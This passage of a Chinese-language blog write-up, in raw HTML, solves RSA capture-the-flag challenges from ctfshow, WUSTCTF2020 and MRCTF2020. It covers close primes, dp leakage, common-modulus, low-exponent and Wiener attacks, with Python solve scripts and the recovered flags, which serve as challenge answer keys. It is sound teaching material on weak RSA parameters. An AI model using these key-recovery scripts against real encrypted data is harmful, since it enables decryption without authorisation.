class="language-python"><span class="token keyword">import</span> gmpy2<span class="token punctuation">,</span>libnum<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token keyword">from</span> secret <span class="token keyword">import</span> flage <span class="token operator">=</span> <span class="token number">0x10001</span>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token comment"># 上面p和q的生成过程说明p和q的相差应该时不大的</span>n <span class="token operator">=</span> p <span class="token operator">*</span> q<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n ="</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span>m <span class="token operator">=</span> libnum<span class="token punctuation">.</span>s2n<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c ="</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># n = 26737417831000820542131903300607349805884383394154602685589253691058592906354935906805134188533804962897170211026684453428204518730064406526279112572388086653330354347467824800159214965211971007509161988095657918569122896402683130342348264873834798355125176339737540844380018932257326719850776549178097196650971801959829891897782953799819540258181186971887122329746532348310216818846497644520553218363336194855498009339838369114649453618101321999347367800581959933596734457081762378746706371599215668686459906553007018812297658015353803626409606707460210905216362646940355737679889912399014237502529373804288304270563</span><span class="token comment"># c = 18343406988553647441155363755415469675162952205929092244387144604220598930987120971635625205531679665588524624774972379282080365368504475385813836796957675346369136362299791881988434459126442243685599469468046961707420163849755187402196540739689823324440860766040276525600017446640429559755587590377841083082073283783044180553080312093936655426279610008234238497453986740658015049273023492032325305925499263982266317509342604959809805578180715819784421086649380350482836529047761222588878122181300629226379468397199620669975860711741390226214613560571952382040172091951384219283820044879575505273602318856695503917257</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个时候通过yafu还有那个在线的网站factordb.com应该都是可以解出p和q的</p><p>直接在线</p><pre class="line-numbers language-none"><code class="language-none">p &#x3D;163515803000813412334620775647541652549604895368507102613553057136855632963322853570924931001138446030409251690646645635800254129997200577719209532684847732809399187385176309169421205833279943214621695444496660249881675974141488357432373412184140130503562295159152949524373214358417567189638680209172147385801<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">flag&#123;p&amp;q_4re_t00_c1o5ed&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="dp泄露"><a href="#dp泄露" class="headerlink" title="dp泄露"></a>dp泄露</h3><blockquote><p>dp的存在是为了在计算之中更加方便，取dp的公式为<code>dp = d % (p-1)</code></p><p>可以使用下面的脚本碰撞得出d</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getd</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> dp<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>dp <span class="token operator">*</span> e <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            x <span class="token operator">=</span> <span class="token punctuation">(</span>dp <span class="token operator">*</span> e <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> i <span class="token operator">+</span> <span class="token number">1</span>            y <span class="token operator">=</span> n <span class="token operator">%</span> x            <span class="token keyword">if</span> y <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                p <span class="token operator">=</span> x                <span class="token keyword">break</span>    q <span class="token operator">=</span> n <span class="token operator">//</span> p    phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>    d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span> <span class="token operator">%</span> phi    <span class="token keyword">return</span> d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>dp换成dq亦可以此法获得d。</p></blockquote><h4 id="WUSTCTF2020-dp-leaking-1s-very-d-angerous"><a href="#WUSTCTF2020-dp-leaking-1s-very-d-angerous" class="headerlink" title="[WUSTCTF2020]dp_leaking_1s_very_d@angerous"></a>[WUSTCTF2020]dp_leaking_1s_very_d@angerous</h4><p>给出数据为</p><pre class="line-numbers language-none"><code class="language-none">e &#x3D; 65537n &#x3D; 156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847c &#x3D; 108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869dp &#x3D; 734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>写个小脚本解密</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytese <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847</span>c <span class="token operator">=</span> <span class="token number">108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869</span>dp <span class="token operator">=</span> <span class="token number">734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825</span><span class="token keyword">def</span> <span class="token function">getd</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> dp<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>dp <span class="token operator">*</span> e <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            x <span class="token operator">=</span> <span class="token punctuation">(</span>dp <span class="token operator">*</span> e <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> i <span class="token operator">+</span> <span class="token number">1</span>            y <span class="token operator">=</span> n <span class="token operator">%</span> x            <span class="token keyword">if</span> y <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                p <span class="token operator">=</span> x                <span class="token keyword">break</span>    q <span class="token operator">=</span> n <span class="token operator">//</span> p    phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>    d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span> <span class="token operator">%</span> phi    <span class="token keyword">return</span> dd <span class="token operator">=</span> getd<span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> dp<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'wctf2020&#123;dp_leaking_1s_very_d@angerous&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h3><h4 id="ctfshow、easyrsa3"><a href="#ctfshow、easyrsa3" class="headerlink" title="ctfshow、easyrsa3"></a>ctfshow、easyrsa3</h4><p><strong>TAG: 共模攻击</strong></p><p>给出数据</p><pre class="line-numbers language-none"><code class="language-none">e &#x3D; 797n &#x3D; 15944475431088053285580229796309956066521520107276817969079550919586650535459242543036143360865780730044733026945488511390818947440767542658956272380389388112372084760689777141392370253850735307578445988289714647332867935525010482197724228457592150184979819463711753058569520651205113690397003146105972408452854948512223702957303406577348717348753106868356995616116867724764276234391678899662774272419841876652126127684683752880568407605083606688884120054963974930757275913447908185712204577194274834368323239143008887554264746068337709465319106886618643849961551092377843184067217615903229068010117272834602469293571c &#x3D; 11157593264920825445770016357141996124368529899750745256684450189070288181107423044846165593218013465053839661401595417236657920874113839974471883493099846397002721270590059414981101686668721548330630468951353910564696445509556956955232059386625725883038103399028010566732074011325543650672982884236951904410141077728929261477083689095161596979213961494716637502980358298944316636829309169794324394742285175377601826473276006795072518510850734941703194417926566446980262512429590253643561098275852970461913026108090608491507300365391639081555316166526932233787566053827355349022396563769697278239577184503627244170930e &#x3D; 521n &#x3D; 15944475431088053285580229796309956066521520107276817969079550919586650535459242543036143360865780730044733026945488511390818947440767542658956272380389388112372084760689777141392370253850735307578445988289714647332867935525010482197724228457592150184979819463711753058569520651205113690397003146105972408452854948512223702957303406577348717348753106868356995616116867724764276234391678899662774272419841876652126127684683752880568407605083606688884120054963974930757275913447908185712204577194274834368323239143008887554264746068337709465319106886618643849961551092377843184067217615903229068010117272834602469293571c &#x3D; 6699274351853330023117840396450375948797682409595670560999898826038378040157859939888021861338431350172193961054314487476965030228381372659733197551597730394275360811462401853988404006922710039053586471244376282019487691307865741621991977539073601368892834227191286663809236586729196876277005838495318639365575638989137572792843310915220039476722684554553337116930323671829220528562573169295901496437858327730504992799753724465760161805820723578087668737581704682158991028502143744445435775458296907671407184921683317371216729214056381292474141668027801600327187443375858394577015394108813273774641427184411887546849<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>n相同，判定所需的攻击方式为共模攻击</p><p>用我特制的脚本拿到了flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;sh4r3_N&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="低加密指数攻击"><a href="#低加密指数攻击" class="headerlink" title="低加密指数攻击"></a>低加密指数攻击</h3><h4 id="ctfshow、easyrsa4"><a href="#ctfshow、easyrsa4" class="headerlink" title="ctfshow、easyrsa4"></a>ctfshow、easyrsa4</h4><p>给出数据为</p><pre class="line-numbers language-none"><code class="language-none">e &#x3D; 3n &#x3D; 18970053728616609366458286067731288749022264959158403758357985915393383117963693827568809925770679353765624810804904382278845526498981422346319417938434861558291366738542079165169736232558687821709937346503480756281489775859439254614472425017554051177725143068122185961552670646275229009531528678548251873421076691650827507829859299300272683223959267661288601619845954466365134077547699819734465321345758416957265682175864227273506250707311775797983409090702086309946790711995796789417222274776215167450093735639202974148778183667502150202265175471213833685988445568819612085268917780718945472573765365588163945754761c &#x3D; 150409620528139732054476072280993764527079006992643377862720337847060335153837950368208902491767027770946661<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>符合低加密指数攻击的一般特性，加密指数指的就是加密过程中所使用的参数<em>e</em>，低加密指数说的就是这个参数很小的时候(一般等于2或3)，可以直接对这个加密后的内容c进行开方来解密。写脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytese <span class="token operator">=</span> <span class="token number">3</span>n <span class="token operator">=</span> <span class="token number">18970053728616609366458286067731288749022264959158403758357985915393383117963693827568809925770679353765624810804904382278845526498981422346319417938434861558291366738542079165169736232558687821709937346503480756281489775859439254614472425017554051177725143068122185961552670646275229009531528678548251873421076691650827507829859299300272683223959267661288601619845954466365134077547699819734465321345758416957265682175864227273506250707311775797983409090702086309946790711995796789417222274776215167450093735639202974148778183667502150202265175471213833685988445568819612085268917780718945472573765365588163945754761</span>c <span class="token operator">=</span> <span class="token number">150409620528139732054476072280993764527079006992643377862720337847060335153837950368208902491767027770946661</span>tmp <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>c<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 防止c已经被模n过了</span>    <span class="token keyword">if</span> tmp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>tmp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        c <span class="token operator">+=</span> nflag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="e很大时-Winner’s-attack"><a href="#e很大时-Winner’s-attack" class="headerlink" title="e很大时(Winner’s attack)"></a>e很大时(Winner’s attack)</h3><h4 id="ctfshow、easyrsa5"><a href="#ctfshow、easyrsa5" class="headerlink" title="ctfshow、easyrsa5"></a>ctfshow、easyrsa5</h4><p>当e很大、d很小时采用winner’s attack攻击。先看看给出的数据</p><pre class="line-numbers language-none"><code class="language-none">e &#x3D; 284100478693161642327695712452505468891794410301906465434604643365855064101922252698327584524956955373553355814138784402605517536436009073372339264422522610010012877243630454889127160056358637599704871937659443985644871453345576728414422489075791739731547285138648307770775155312545928721094602949588237119345n &#x3D; 468459887279781789188886188573017406548524570309663876064881031936564733341508945283407498306248145591559137207097347130203582813352382018491852922849186827279111555223982032271701972642438224730082216672110316142528108239708171781850491578433309964093293907697072741538649347894863899103340030347858867705231c &#x3D; 350429162418561525458539070186062788413426454598897326594935655762503536409897624028778814302849485850451243934994919418665502401195173255808119461832488053305530748068788500746791135053620550583421369214031040191188956888321397450005528879987036183922578645840167009612661903399312419253694928377398939392827<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>三个参数很接近的时候，采用维纳攻击，我对维纳攻击的脚本编写的原理不是特别清楚，这里我只是一个脚本小子，直接<code>pip3 install owiener</code>下载维纳攻击的工具即可，编写脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token keyword">import</span> owienere <span class="token operator">=</span> <span class="token number">284100478693161642327695712452505468891794410301906465434604643365855064101922252698327584524956955373553355814138784402605517536436009073372339264422522610010012877243630454889127160056358637599704871937659443985644871453345576728414422489075791739731547285138648307770775155312545928721094602949588237119345</span>n <span class="token operator">=</span> <span class="token number">468459887279781789188886188573017406548524570309663876064881031936564733341508945283407498306248145591559137207097347130203582813352382018491852922849186827279111555223982032271701972642438224730082216672110316142528108239708171781850491578433309964093293907697072741538649347894863899103340030347858867705231</span>c <span class="token operator">=</span> <span class="token number">350429162418561525458539070186062788413426454598897326594935655762503536409897624028778814302849485850451243934994919418665502401195173255808119461832488053305530748068788500746791135053620550583421369214031040191188956888321397450005528879987036183922578645840167009612661903399312419253694928377398939392827</span>d <span class="token operator">=</span> owiener<span class="token punctuation">.</span>attack<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># flag&#123;very_biiiiig_e&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="已知p高位攻击"><a href="#已知p高位攻击" class="headerlink" title="已知p高位攻击"></a>已知p高位攻击</h3><h4 id="ctfshow、easyrsa7"><a href="#ctfshow、easyrsa7" class="headerlink" title="ctfshow、easyrsa7"></a>ctfshow、easyrsa7</h4><p>给出的条件为</p><pre class="line-numbers language-none"><code class="language-none">e &#x3D; 0x10001p&gt;&gt;128&lt;&lt;128 &#x3D; 0xd1c520d9798f811e87f4ff406941958bab8fc24b19a32c3ad89b0b73258ed3541e9ca696fd98ce15255264c39ae8c6e8db5ee89993fa44459410d30a0a8af700ae3aee8a9a1d6094f8c757d3b79a8d1147e85be34fb260a970a52826c0a92b46cefb5dfaf2b5a31edf867f8d34d2222900000000000000000000000000000000n &#x3D; 0x79e0bf9b916e59286163a1006f8cefd4c1b080387a6ddb98a3f3984569a4ebb48b22ac36dff7c98e4ebb90ffdd9c07f53a20946f57634fb01f4489fcfc8e402865e152820f3e2989d4f0b5ef1fb366f212e238881ea1da017f754d7840fc38236edba144674464b661d36cdaf52d1e5e7c3c21770c5461a7c1bc2db712a61d992ebc407738fc095cd8b6b64e7e532187b11bf78a8d3ddf52da6f6a67c7e88bef5563cac1e5ce115f3282d5ff9db02278859f63049d1b934d918f46353fea1651d96b2ddd874ec8f1e4b9d487d8849896d1c21fb64029f0d6f47e560555b009b96bfd558228929a6cdf3fb6d47a956829fb1e638fcc1bdfad4ec2c3590dea1ed3c &#x3D; 0x1b2b4f9afed5fb5f9876757e959c183c2381ca73514b1918d2f123e386bebe9832835350f17ac439ac570c9b2738f924ef49afea02922981fad702012d69ea3a3c7d1fc8efc80e541ca2622d7741090b9ccd590906ac273ffcc66a7b8c0d48b7d62d6cd6dd4cd75747c55aac28f8be3249eb255d8750482ebf492692121ab4b27b275a0f69b15baef20bf812f3cbf581786128b51694331be76f80d6fb1314d8b280eaa16c767821b9c2ba05dfde5451feef22ac3cb3dfbc88bc1501765506f0c05045184292a75c475486b680f726f44ef8ddfe3c48f75bb03c8d44198ac70e6b7c885f53000654db22c8cee8eb4f65eaeea2da13887aaf53d8c254d2945691<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>给出了p的高位，这时候可以利用Coppersmith攻击来恢复p，这个我现在也不是特别了解原理，明天再看看。</p><h3 id="复杂的RSA"><a href="#复杂的RSA" class="headerlink" title="复杂的RSA"></a>复杂的RSA</h3><blockquote><p>​    这里把下面的所有的RSA的题目全部归类为复杂的rsa题目，既能归为复杂，必然是用到的不仅仅是rsa的知识，或者就是有多重加密的嵌套，但是起主要作用的还是rsa亦可归为此类之中。</p><p>​    现在的比赛的题目大多数都是这种了，就是给你一个用来加密的脚本，让你自己找加密中的脆弱的地方，从而实现破解。</p></blockquote><h4 id="MRCTF2020-babyRSA"><a href="#MRCTF2020-babyRSA" class="headerlink" title="[MRCTF2020]babyRSA"></a>[MRCTF2020]babyRSA</h4><p>给出的加密的脚本为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sympy<span class="token keyword">import</span> random<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> gcd<span class="token punctuation">,</span> invert<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> isPrime<span class="token punctuation">,</span> getRandomNBitInteger<span class="token punctuation">,</span> bytes_to_long<span class="token punctuation">,</span> long_to_bytes<span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>flag <span class="token operator">=</span> <span class="token string">b"MRCTF&#123;xxxx&#125;"</span>base <span class="token operator">=</span> <span class="token number">65537</span><span class="token keyword">def</span> <span class="token function">GCD</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">:</span>    B <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        B <span class="token operator">=</span> gcd<span class="token punctuation">(</span>A<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> B<span class="token keyword">def</span> <span class="token function">gen_p</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    P <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    P<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        P<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>P<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"P_p :"</span><span class="token punctuation">,</span> P<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    n <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        n <span class="token operator">*=</span> P<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    factor <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> base<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"P_factor :"</span><span class="token punctuation">,</span> factor<span class="token punctuation">)</span>    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gen_q</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sub_Q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    Q_1 <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    Q_2 <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    Q <span class="token operator">=</span> sub_Q <span class="token operator">**</span> Q_2 <span class="token operator">%</span> Q_1    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Q_1: "</span><span class="token punctuation">,</span> Q_1<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Q_2: "</span><span class="token punctuation">,</span> Q_2<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sub_Q: "</span><span class="token punctuation">,</span> sub_Q<span class="token punctuation">)</span>    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>Q<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    _E <span class="token operator">=</span> base    _P <span class="token operator">=</span> gen_p<span class="token punctuation">(</span><span class="token punctuation">)</span>    _Q <span class="token operator">=</span> gen_q<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> <span class="token punctuation">(</span>gcd<span class="token punctuation">(</span>_E<span class="token punctuation">,</span> <span class="token punctuation">(</span>_P <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>_Q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>    _M <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    _C <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>_M<span class="token punctuation">,</span> _E<span class="token punctuation">,</span> _P <span class="token operator">*</span> _Q<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Ciphertext = "</span><span class="token punctuation">,</span> _C<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''P_p : 206027926847308612719677572554991143421P_factor : 213671742765908980787116579976289600595864704574134469173111790965233629909513884704158446946409910475727584342641848597858942209151114627306286393390259700239698869487469080881267182803062488043469138252786381822646126962323295676431679988602406971858136496624861228526070581338082202663895710929460596143281673761666804565161435963957655012011051936180536581488499059517946308650135300428672486819645279969693519039407892941672784362868653243632727928279698588177694171797254644864554162848696210763681197279758130811723700154618280764123396312330032986093579531909363210692564988076206283296967165522152288770019720928264542910922693728918198338839Q_1:  103766439849465588084625049495793857634556517064563488433148224524638105971161051763127718438062862548184814747601299494052813662851459740127499557785398714481909461631996020048315790167967699932967974484481209879664173009585231469785141628982021847883945871201430155071257803163523612863113967495969578605521Q_2:  151010734276916939790591461278981486442548035032350797306496105136358723586953123484087860176438629843688462671681777513652947555325607414858514566053513243083627810686084890261120641161987614435114887565491866120507844566210561620503961205851409386041194326728437073995372322433035153519757017396063066469743sub_Q:  168992529793593315757895995101430241994953638330919314800130536809801824971112039572562389449584350643924391984800978193707795909956472992631004290479273525116959461856227262232600089176950810729475058260332177626961286009876630340945093629959302803189668904123890991069113826241497783666995751391361028949651Ciphertext =  1709187240516367141460862187749451047644094885791761673574674330840842792189795049968394122216854491757922647656430908587059997070488674220330847871811836724541907666983042376216411561826640060734307013458794925025684062804589439843027290282034999617915124231838524593607080377300985152179828199569474241678651559771763395596697140206072537688129790126472053987391538280007082203006348029125729650207661362371936196789562658458778312533505938858959644541233578654340925901963957980047639114170033936570060250438906130591377904182111622236567507022711176457301476543461600524993045300728432815672077399879668276471832'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    注意到上面的加密过程给出的q相关的数据比较多，解q也比较简单，直接求一下<code>Q = sub_Q ** Q_2 % Q_1</code>然后求一下<code>sympy.nextprime(Q)</code>即可。</p><p>​    再看p，p是直接<code>p = getPrime(1024)</code>获取的，但是给出了加密后的m<code>factor = pow(p, base, 